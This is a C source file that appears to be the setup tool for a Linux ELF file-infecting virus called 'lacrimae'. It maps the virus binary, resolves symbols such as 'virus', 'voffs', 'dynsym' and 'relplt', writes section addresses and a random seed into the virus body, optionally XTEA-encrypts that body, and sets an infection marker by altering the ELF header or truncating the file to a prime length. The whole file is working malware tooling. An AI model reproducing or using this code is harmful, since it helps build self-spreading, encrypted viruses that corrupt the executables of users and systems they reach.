#include <assert.h>
#include <stdio.h>
#include <elf.h>
#include <stdint.h>
#include <sys/mman.h>

#include "config.h"

#include "xtea.c"

#ifdef	ADVANCED_MARKER
#include "primes.c"
#endif

struct Symbols {
	char *name;
	uint32_t value;
} symbols[] = {
	{ "lacrimae", 0 },

	{ "data_end", 0 },
	{ "virus", 0 },
	
	{ "voffs", 0 },
	{ "randseed", 0 },
	{ "stext", 0 },
	{ "dynsym", 0 },
	{ "dynstr", 0 },
	{ "relplt", 0 },
	{ "etext", 0 },
	{ NULL, 0 },
};

int main(int argc, char **argv)
{
	Elf32_Ehdr *ehdr;
	Elf32_Shdr *shdr;
	unsigned char *strtab, *m;
        int size, h, l, i, j, k, s_text, s_data, s_dynstr, s_dynsym, s_relplt;
        unsigned int ep;

	h = open("lacrimae", 2);
	l = lseek(h, 0, 2);
	m = mmap(NULL, l, PF_R|PF_W, MAP_SHARED, h, 0);
	
	ehdr = (Elf32_Ehdr*)m;
	shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);
	strtab  = m + shdr[ehdr->e_shstrndx].sh_offset;
	for (i = 0; i < ehdr->e_shnum; i++) {
		if (shdr[i].sh_type == SHT_SYMTAB) {
			Elf32_Sym *sym = (Elf32_Sym*)(m + shdr[i].sh_offset);
			int size = shdr[i].sh_size / sizeof(Elf32_Sym);
			char *symstr = m + shdr[shdr[i].sh_link].sh_offset;
			for (j = 0; j < size; j++) {
				for (k = 0; symbols[k].name != NULL; k++)
					if (! strcmp(sym[j].st_name + symstr, symbols[k].name)) {
						symbols[k].value = sym[j].st_value;
						break;
					}
			}
		}
		if (! strcmp(strtab + shdr[i].sh_name, ".data"))
			s_data = i;
		if (! strcmp(strtab + shdr[i].sh_name, ".text"))
			s_text = i;
		if (! strcmp(strtab + shdr[i].sh_name, ".dynsym"))
			s_dynsym = i;
		if (! strcmp(strtab + shdr[i].sh_name, ".dynstr"))
			s_dynstr = i;
		if (! strcmp(strtab + shdr[i].sh_name, ".rel.plt"))
			s_relplt = i;
		
	}
	if (s_data == 0 || s_text == 0 || s_dynsym == 0 || s_dynstr == 0 || s_relplt == 0)
		return 2;
	for (i = 1; symbols[i].name != NULL; i++) {
		symbols[i].value = symbols[i].value - shdr[s_data].sh_addr + shdr[s_data].sh_offset;
		printf("%-16s %08x\n", symbols[i].name, symbols[i].value);
	}
	assert(*(uint32_t*)(m + symbols[3].value) == 0xdeadbeef);
	*(uint32_t*)(m + symbols[3].value) = symbols[0].value;		/* voffs */
	*(uint32_t*)(m + symbols[4].value) = time(NULL) * getpid();	/* randseed */
	*(uint32_t*)(m + symbols[5].value) = shdr[s_text].sh_addr;	/* stext */
	*(uint32_t*)(m + symbols[6].value) = shdr[s_dynsym].sh_addr;	/* dynsym */
	*(uint32_t*)(m + symbols[7].value) = shdr[s_dynstr].sh_addr;	/* dynstr */
	*(uint32_t*)(m + symbols[8].value) = shdr[s_relplt].sh_addr;	/* dynstr */
	*(uint32_t*)(m + symbols[9].value) = shdr[s_text].sh_addr +
						shdr[s_text].sh_size;	/* end of .text */

	size = symbols[1].value - symbols[2].value;
	printf("Virus data size = %d\n", size);
#ifndef	ADVANCED_MARKER
	m[15]++;
#endif
#ifdef	ENCRYPT_DATA
	uint8_t *p = m + symbols[2].value;
	size += 7;
	size &= ~7;
	unsigned long *key = (unsigned long*)p;
	for (i = 16; (i + 8) <= size; i += 8) {
		encipher((unsigned long*)(p + i), key);
		key[0] += key[1];
		key[1] += key[2];
		key[2] += key[3];
		key[3] += key[0];		
	}
#endif
	munmap(m, l);
#ifdef	ADVANCED_MARKER
	uint8_t *primes;
	if ((primes = make_primes(MAX_SIZE)) == NULL)
		return 2;
	ftruncate(h, find_nearest_prime(l, primes, MAX_SIZE));
#endif
        close(h);	
        return 0;
}
